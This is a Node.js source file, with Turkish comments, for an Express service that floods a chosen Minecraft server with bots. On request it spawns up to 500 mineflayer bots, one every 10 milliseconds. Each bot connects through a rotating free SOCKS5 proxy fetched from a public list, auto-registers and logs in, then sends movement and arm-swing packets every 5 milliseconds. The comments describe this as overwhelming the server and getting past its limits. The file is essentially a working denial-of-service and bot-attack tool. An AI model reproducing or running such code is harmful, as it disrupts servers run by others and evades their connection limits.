const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let proxyList = [];

// 🔄 OTOMATİK TAZE PROXY ÇEKİCİ (Limitleri bu yıkar)
async function updateProxies() {
    try {
        const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all');
        const data = await response.text();
        proxyList = data.split('\r\n').filter(p => p.length > 0).map(p => `socks5://${p}`);
        console.log(`[🌐] ${proxyList.length} adet taze SOCKS5 proxy yüklendi!`);
    } catch (err) {
        console.log("[!] Proxy çekilemedi, eski liste kullanılacak.");
    }
}

// Sunucu başlarken proxyleri çek
updateProxies();
setInterval(updateProxies, 600000); // Her 10 dakikada bir listeyi yenile

app.post('/deploy', async (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[!!! TURBO MODE !!!] 129GB RAM ile ${count} bot sevk ediliyor.`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // HIZ: Her 10ms'de bir bot fırlat (Neredeyse aynı anda!)
        setTimeout(() => {
            const currentProxy = proxyList[i % proxyList.length];
            if (!currentProxy) return;

            const agent = new ProxyAgent(currentProxy);

            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `Resul_VIP_${Math.floor(Math.random() * 999999)}`,
                agent: agent,
                hideErrors: true,
                skipValidation: true, // Giriş protokolünü hızlandırır
                waitNextTick: false
            });

            bot.on('spawn', () => {
                console.log(`[🔥] GİRİŞ BAŞARILI: ${bot.username}`);
                
                // ANINDA KAYIT VE GİRİŞ
                bot.chat(`/register resul3163 resul3163`);
                bot.chat(`/login resul3163`);

                // SUNUCUYU KİLİTLEYEN PAKET FIRTINASI
                setInterval(() => {
                    if(bot.entity) {
                        bot.look(Math.random() * 360, Math.random() * 180);
                        bot.swingArm('right');
                        bot.setControlState('jump', true);
                    }
                }, 5); // 5ms'de bir paket (Ultra Stress)
            });

            bot.on('error', (err) => {}); // Hataları gizle ki terminal kasmısın
        }, i * 10); // 10ms gecikme = saniyede 100 bot!
    }
    res.json({ success: true, message: "Turbo Ordu ve Auto-Proxy Devrede!" });
});

app.listen(process.env.PORT || 3000);
                
